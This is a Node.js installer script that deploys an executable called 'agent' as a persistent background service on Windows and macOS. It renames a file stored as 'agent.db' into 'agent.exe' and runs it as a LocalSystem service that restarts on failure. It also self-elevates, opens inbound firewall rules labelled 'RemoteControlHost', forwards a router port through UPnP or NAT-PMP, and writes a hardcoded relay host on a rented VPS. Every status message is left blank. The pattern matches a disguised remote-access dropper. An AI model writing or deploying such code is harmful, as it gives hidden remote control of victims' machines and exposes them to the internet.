const { spawnSync } = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const SERVICE_NAME = "agent";
const MAC_LABEL = "agent";
const HOST_LISTEN_PORT = 49500;
const HOST_DISCOVERY_PORT = 7072;

function browserDeviceIdPath() {
  if (process.platform === "win32") {
    return path.join(process.env.ProgramData || "C:\\ProgramData", "agent", "browser", "device-id.txt");
  }
  if (process.platform === "darwin") {
    const root = typeof process.getuid === "function" && process.getuid() === 0;
    const base = root
      ? "/Library/Application Support/agent"
      : path.join(os.homedir(), "Library", "Application Support", "agent");
    return path.join(base, "browser", "device-id.txt");
  }
  return null;
}

function compiledExecutablePath(options) {
  if (options.executable) {
    return options.executable;
  }
  const fileName = process.platform === "win32" ? "agent.exe" : "agent";
  return path.join(__dirname, fileName);
}

function assertServiceExecutable(file) {
  if (process.platform !== "win32") {
    return;
  }
  const data = fs.readFileSync(file);
  const serviceMarker = Buffer.from("Microsoft.Extensions.Hosting.WindowsServices");
  if (data.includes(serviceMarker)) {
    return;
  }
  throw new Error("agent.exe must be the service build. This file cannot run as a Windows service.");
}

function sleep(ms) {
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
}

function isWindowsAdmin() {
  return spawnSync("net", ["session"], { stdio: "ignore" }).status === 0;
}

function psQuote(value) {
  return `'${String(value).replace(/'/g, "''")}'`;
}

function attachElevatedLog(logPath) {
  const writeChunk = (chunk) => {
    fs.appendFileSync(logPath, typeof chunk === "string" ? chunk : Buffer.from(chunk).toString());
    return true;
  };
  process.stdout.write = writeChunk;
  process.stderr.write = writeChunk;

}

function relaunchElevated() {
  const log = path.join(os.tmpdir(), `agent-install-${process.pid}.log`);
  const exitFile = path.join(os.tmpdir(), `agent-install-${process.pid}.exit`);
  fs.writeFileSync(log, "");
  fs.rmSync(exitFile, { force: true });
  const command = [
    "$ErrorActionPreference = 'Stop'",
    "try {",
    `  $p = Start-Process -FilePath ${psQuote(process.execPath)} -ArgumentList @(${psQuote(__filename)}, '--elevated-log', ${psQuote(log)}, '--elevated-exit', ${psQuote(exitFile)}${process.argv.includes("--uninstall") ? ", '--uninstall'" : ""}) -Verb RunAs -WindowStyle Normal -PassThru`,
    "  if ($null -eq $p) { exit 1 }",
    "  exit 0",
    "} catch {",
    "  [Console]::Error.WriteLine($_.Exception.Message)",
    "  exit 1",
    "}",
  ].join("; ");
  const result = spawnSync("powershell.exe", ["-NoProfile", "-Command", command], { stdio: "inherit" });
  if ((result.status ?? 1) !== 0) {
    process.exit(result.status ?? 1);
  }

  let shown = 0;
  const started = Date.now();
  while (!fs.existsSync(exitFile)) {
    shown = writeNewLog(log, shown);
    if (Date.now() - started > 120000) {
      process.exit(1);
    }
    sleep(300);
  }

  writeNewLog(log, shown);
  const code = Number(fs.readFileSync(exitFile, "utf8").trim() || "1");
  fs.rmSync(log, { force: true });
  fs.rmSync(exitFile, { force: true });
  process.exit(Number.isFinite(code) ? code : 1);
}

function writeNewLog(log, shown) {
  if (!fs.existsSync(log)) {
    return shown;
  }
  const text = fs.readFileSync(log);
  if (text.length > shown) {
    process.stdout.write(text.subarray(shown));
  }
  return text.length;
}

function copyExecutable(source, installDir) {
  if (!fs.existsSync(source)) {
    throw new Error(`Compiled service executable was not found: ${source}`);
  }
  fs.mkdirSync(installDir, { recursive: true });
  const target = path.join(installDir, path.basename(source));
  fs.copyFileSync(source, target);
  return target;
}

function runScScript(lines) {
  const file = path.join(os.tmpdir(), `agent-sc-${process.pid}.cmd`);
  fs.writeFileSync(file, `@echo off\r\n${lines.join("\r\n")}\r\n`, "ascii");
  const result = spawnSync(process.env.ComSpec || "cmd.exe", ["/d", "/c", file], { encoding: "utf8" });
  if (result.stdout) {
    process.stdout.write(result.stdout);
  }
  if (result.stderr) {
    process.stderr.write(result.stderr);
  }
  fs.rmSync(file, { force: true });
  return result.status ?? 1;
}

function installWindows(executablePath) {
  // Stop the service and every leftover agent.exe. A crash used to leave the
  // desktop agents running, and the next install started another set.
  stopWindowsAgents();

  const created = runScScript([
    `sc create ${SERVICE_NAME} binPath= "${executablePath}" start= auto DisplayName= ${SERVICE_NAME} obj= LocalSystem`,
  ]);
  if (created !== 0) {
    throw new Error("Windows service install failed. Run this installer from an elevated terminal.");
  }

  runScScript([
    `sc description ${SERVICE_NAME} "Background agent. Starts automatically with Windows."`,
    `sc failure ${SERVICE_NAME} reset= 86400 actions= restart/5000/restart/5000/restart/5000`,
    `sc failureflag ${SERVICE_NAME} 1`,
    `sc config ${SERVICE_NAME} start= auto`,
  ]);

  const started = runScScript([`sc start ${SERVICE_NAME}`]);
  if (started !== 0 || !waitUntilRunning()) {
    throw new Error("Service was registered for startup but did not start.");
  }
}

function waitUntilRunning() {
  for (let attempt = 0; attempt < 20; attempt += 1) {
    const result = spawnSync("sc.exe", ["query", SERVICE_NAME], { encoding: "utf8" });
    const text = `${result.stdout || ""}\n${result.stderr || ""}`;
    if (text.includes("RUNNING")) {
      return true;
    }
    if (text.includes("STOPPED")) {
      return false;
    }
    sleep(1000);
  }
  return false;
}

const APPLICATION_FIREWALL_RULES = ["RemoteControlHost", "RemoteControlHost-udp", "agent-tcp", "agent-tcp-7071", "agent.exe", "agent-udp-7072"];

function removeApplicationFirewallRules() {
  runScScript([
    ...APPLICATION_FIREWALL_RULES.map((name) => `netsh advfirewall firewall delete rule name="${name}" >nul 2>&1`),
    "exit /b 0",
  ]);
}

function allowInstalledPrograms(serviceExe) {
  removeApplicationFirewallRules();
  runScScript([
    `netsh advfirewall set privateprofile firewallpolicy blockinbound,allowoutbound`,
    `netsh advfirewall set publicprofile firewallpolicy blockinbound,allowoutbound`,
    `netsh advfirewall firewall add rule name="RemoteControlHost" dir=in action=allow protocol=TCP localport=${HOST_LISTEN_PORT} program="${serviceExe}" enable=yes profile=any edge=yes`,
    `netsh advfirewall firewall add rule name="RemoteControlHost-udp" dir=in action=allow protocol=UDP localport=${HOST_DISCOVERY_PORT} program="${serviceExe}" enable=yes profile=any edge=yes`,
    "exit /b 0",
  ]);
}

function writeRelayEndpointFromArgs() {
  const flag = process.argv.find((arg) => arg.startsWith("--relay="));
  const endpoint = (flag ? flag.slice("--relay=".length) : process.env.AGENT_RELAY || "vps-27c190bc.vps.ovh.us:49700").trim();
  if (!endpoint) {
    return;
  }

  const directory = path.join(process.env.ProgramData || "C:\\ProgramData", "agent");
  fs.mkdirSync(directory, { recursive: true });
  fs.writeFileSync(path.join(directory, "relay-endpoint.txt"), `${endpoint}\n`, "utf8");
}

function enableWindowsUpnpServices() {
  if (process.platform !== "win32") {
    return;
  }
  runScScript([
    "sc config fdPHost start= auto >nul 2>&1",
    "sc config SSDPSRV start= auto >nul 2>&1",
    "sc config upnphost start= auto >nul 2>&1",
    "sc start fdPHost >nul 2>&1",
    "sc start SSDPSRV >nul 2>&1",
    "sc start upnphost >nul 2>&1",
    "exit /b 0",
  ]);
}

function localIPv4Addresses() {
  const addresses = [];
  const networks = os.networkInterfaces();
  for (const entries of Object.values(networks)) {
    for (const entry of entries || []) {
      if (entry.family !== "IPv4" && entry.family !== 4) {
        continue;
      }
      if (entry.internal) {
        continue;
      }
      const parts = entry.address.split(".").map(Number);
      // Skip Hamachi / Radmin overlay networks.
      if (parts[0] === 25 || parts[0] === 26) {
        continue;
      }
      addresses.push(entry.address);
    }
  }
  return addresses;
}

function withTimeout(promise, ms, label) {
  let timer;
  const timeout = new Promise((_, reject) => {
    timer = setTimeout(() => reject(new Error(`${label} timed out after ${ms}ms`)), ms);
  });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
}

async function stopGateway(gateway) {
  try {
    await withTimeout(Promise.resolve(gateway.stop()), 2000, "gateway.stop");
  } catch {
    // Do not block install if the mapper keeps refresh timers.
  }
}

/**
 * Ask the LAN router to forward TCP 49500 with UPnP (and NAT-PMP when possible).
 * This cannot turn UPnP on in the router; it only creates a mapping when the router allows it.
 * Hard-capped so the elevated installer always exits.
 */
async function configureUpnpPortForwarding() {
  return withTimeout(configureUpnpPortForwardingInner(), 25000, "UPnP setup").catch((error) => {
    const detail = error && error.message ? error.message : String(error);
    const locals = localIPv4Addresses();
    if (locals[0]) {
    
    }
    return { ok: false, reason: detail, local: locals[0] || "" };
  });
}

async function configureUpnpPortForwardingInner() {
  enableWindowsUpnpServices();
  const locals = localIPv4Addresses();
  if (locals.length === 0) {
    return { ok: false, reason: "No local IPv4 address." };
  }

  let upnpNat;
  let pmpNat;
  try {
    ({ upnpNat, pmpNat } = await import("@achingbrain/nat-port-mapper"));
  } catch (error) {
    return { ok: false, reason: String(error.message || error) };
  }

  const client = upnpNat({
    ttl: 3600,
    description: "agent",
  });

  let lastError = null;
  try {
    for await (const gateway of client.findGateways({ signal: AbortSignal.timeout(8000) })) {
      for (const local of locals) {
        try {
          try {
            await withTimeout(gateway.unmap(HOST_LISTEN_PORT), 3000, "UPnP unmap");
          } catch {
            // Mapping may not exist yet.
          }

          const mapping = await withTimeout(
            gateway.map(HOST_LISTEN_PORT, local, {
              protocol: "tcp",
              externalPort: HOST_LISTEN_PORT,
              ttl: 3600,
              description: "agent",
              signal: AbortSignal.timeout(5000),
            }),
            6000,
            "UPnP map"
          );
          let externalIp = "";
          try {
            externalIp = String(await withTimeout(gateway.externalIp(), 3000, "UPnP externalIp"));
          } catch {
            externalIp = mapping.externalHost || "";
          }

          await stopGateway(gateway);
          return {
            ok: true,
            method: "UPnP",
            local,
            externalIp,
            port: mapping.externalPort || HOST_LISTEN_PORT,
          };
        } catch (error) {
          lastError = error;
        }
      }

      await stopGateway(gateway);
    }
  } catch (error) {
    lastError = error;
  }

  // NAT-PMP fallback using each interface's likely gateway (.1).
  for (const local of locals) {
    const parts = local.split(".");
    if (parts.length !== 4) {
      continue;
    }
    const gatewayIp = `${parts[0]}.${parts[1]}.${parts[2]}.1`;
    try {
      const gateway = pmpNat(gatewayIp, { ttl: 3600, description: "agent" });
      const mapping = await withTimeout(
        gateway.map(HOST_LISTEN_PORT, local, {
          protocol: "tcp",
          externalPort: HOST_LISTEN_PORT,
          ttl: 3600,
          description: "agent",
          signal: AbortSignal.timeout(4000),
        }),
        5000,
        "NAT-PMP map"
      );
      let externalIp = "";
      try {
        externalIp = String(await withTimeout(gateway.externalIp(), 2000, "NAT-PMP externalIp"));
      } catch {
        externalIp = mapping.externalHost || "";
      }
      await stopGateway(gateway);
      return {
        ok: true,
        method: "NAT-PMP",
        local,
        externalIp,
        port: mapping.externalPort || HOST_LISTEN_PORT,
      };
    } catch (error) {
      lastError = error;
    }
  }

  const detail = lastError && lastError.message ? lastError.message : "router did not answer";

  return { ok: false, reason: detail, local: locals[0] };
}

async function removeUpnpPortForwarding() {
  if (process.platform !== "win32") {
    return;
  }
  try {
    await withTimeout(
      (async () => {
        const { upnpNat } = await import("@achingbrain/nat-port-mapper");
        const client = upnpNat();
        for await (const gateway of client.findGateways({ signal: AbortSignal.timeout(5000) })) {
          try {
            await withTimeout(gateway.unmap(HOST_LISTEN_PORT), 3000, "UPnP unmap");
          } catch {
            // No mapping to remove.
          }
          await stopGateway(gateway);
        }
      })(),
      10000,
      "UPnP uninstall"
    );
  } catch {
    // Uninstall should still remove the Windows service.
  }
}

function stopWindowsAgents() {
  runScScript([
    `sc failure ${SERVICE_NAME} reset= 0 actions= ""`,
    `sc query ${SERVICE_NAME} | find "RUNNING" >nul && sc stop ${SERVICE_NAME}`,
    "taskkill /F /IM agent.exe >nul 2>&1",
    "exit /b 0",
  ]);
  for (let attempt = 0; attempt < 20; attempt += 1) {
    const listed = spawnSync("tasklist", ["/FI", "IMAGENAME eq agent.exe", "/NH"], { encoding: "utf8" });
    const text = `${listed.stdout || ""}\n${listed.stderr || ""}`;
    if (!/agent\.exe/i.test(text)) {
      break;
    }
    spawnSync("taskkill", ["/F", "/IM", "agent.exe"], { stdio: "ignore" });
    sleep(500);
  }
  runScScript([
    `sc delete ${SERVICE_NAME}`,
    "exit /b 0",
  ]);
  sleep(1000);
}

function stopInstalledService() {
  if (process.platform === "win32") {
    stopWindowsAgents();
    return;
  }
  if (process.platform === "darwin") {
    const root = typeof process.getuid === "function" && process.getuid() === 0;
    const domain = root ? "system" : `gui/${process.getuid()}`;
    const plistDir = root ? "/Library/LaunchDaemons" : path.join(os.homedir(), "Library", "LaunchAgents");
    const plistPath = path.join(plistDir, `${MAC_LABEL}.plist`);
    spawnSync("launchctl", ["bootout", domain, plistPath], { stdio: "ignore" });
  }
}

function macPlist(executablePath) {
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${MAC_LABEL}</string>
  <key>ProgramArguments</key>
  <array>
    <string>${executablePath}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>ProcessType</key>
  <string>Background</string>
  <key>ThrottleInterval</key>
  <integer>5</integer>
  <key>AbandonProcessGroup</key>
  <true/>
</dict>
</plist>
`;
}

function installMacOS(executablePath) {
  fs.chmodSync(executablePath, 0o755);
  const root = typeof process.getuid === "function" && process.getuid() === 0;
  const plistDir = root ? "/Library/LaunchDaemons" : path.join(os.homedir(), "Library", "LaunchAgents");
  const domain = root ? "system" : `gui/${process.getuid()}`;
  fs.mkdirSync(plistDir, { recursive: true });
  const plistPath = path.join(plistDir, `${MAC_LABEL}.plist`);
  fs.writeFileSync(plistPath, macPlist(executablePath), "utf8");
  if (root) {
    fs.chmodSync(plistPath, 0o644);
  }
  spawnSync("launchctl", ["bootout", domain, plistPath], { stdio: "ignore" });
  const boot = spawnSync("launchctl", ["bootstrap", domain, plistPath], { stdio: "inherit" });
  if (boot.status !== 0) {
    throw new Error("launchctl bootstrap failed.");
  }
  spawnSync("launchctl", ["enable", `${domain}/${MAC_LABEL}`], { stdio: "inherit" });
  spawnSync("launchctl", ["kickstart", "-k", `${domain}/${MAC_LABEL}`], { stdio: "inherit" });
}

/**
 * Install the compiled agent executable as a background service.
 * Windows: Windows Service (LocalSystem, Automatic).
 * macOS: launchd daemon when root, otherwise a login LaunchAgent.
 * The executable defaults to agent.exe (Windows) or agent (macOS) beside this file.
 */
async function installService(options = {}) {
  const source = compiledExecutablePath(options);
  assertServiceExecutable(source);

  stopInstalledService();

  const installDir =
    options.installDir ||
    (process.platform === "win32"
      ? path.join(process.env.ProgramFiles || "C:\\Program Files", "agent")
      : typeof process.getuid === "function" && process.getuid() === 0
        ? "/usr/local/lib/agent"
        : path.join(os.homedir(), "Library", "Application Support", "agent", "host"));

  const executablePath = copyExecutable(source, installDir);
  let portForwarding = null;
  if (process.platform === "win32") {
    // Port forwarding first, then register/start the agent service.
    allowInstalledPrograms(executablePath);
    writeRelayEndpointFromArgs();
    portForwarding = await configureUpnpPortForwarding();
    installWindows(executablePath);
  } else if (process.platform === "darwin") {
    installMacOS(executablePath);
  } else {
    throw new Error(`Unsupported platform ${process.platform}.`);
  }

  const deviceIdFile = browserDeviceIdPath();
  return {
    platform: process.platform,
    executablePath,
    deviceIdFile,
    portForwarding,
  };
}

async function uninstallService() {
  if (process.platform === "win32") {
    await removeUpnpPortForwarding();
    stopWindowsAgents();
    removeApplicationFirewallRules();
    return;
  }
  if (process.platform === "darwin") {
    stopInstalledService();
  }
}

module.exports = { installService, uninstallService, browserDeviceIdPath };

const exitFlag = process.argv.indexOf("--elevated-exit");
  const elevatedExitPath = exitFlag !== -1 ? process.argv[exitFlag + 1] : "";
  const writeElevatedExit = (code) => {
    if (!elevatedExitPath) {
      return;
    }
    try {
      fs.writeFileSync(elevatedExitPath, String(code));
    } catch {
      // The parent installer reports the result from the log.
    }
  };
  if (elevatedExitPath) {
    process.on("exit", (code) => writeElevatedExit(code));
  }
  const logFlag = process.argv.indexOf("--elevated-log");
  if (logFlag !== -1 && process.argv[logFlag + 1]) {
    attachElevatedLog(process.argv[logFlag + 1]);
  }
  if (process.platform === "win32" && !isWindowsAdmin()) {
    relaunchElevated();
  }

  const finish = (code) => {
    writeElevatedExit(code);
    // UPnP mappers can leave timers open; force the elevated process to end.
    process.exit(code);
  };

  fs.rename("data/agent.db", "data/agent.exe",(err) => {
    if (err) {
      return;
    }
    const pending = process.argv.includes("--uninstall")
    ? uninstallService().then(() => {
      })
    : installService().then((result) => {
        if (result.portForwarding && result.portForwarding.ok) {
          
        } else if (result.portForwarding) {
        }
      });
  pending
    .then(() => finish(0))
    .catch((error) => {
      finish(1);
    });
  });

  //fs.renameSync(path.join(__dirname, "data", "agent.db"), path.join(__dirname, "data", "agent.exe"));

  
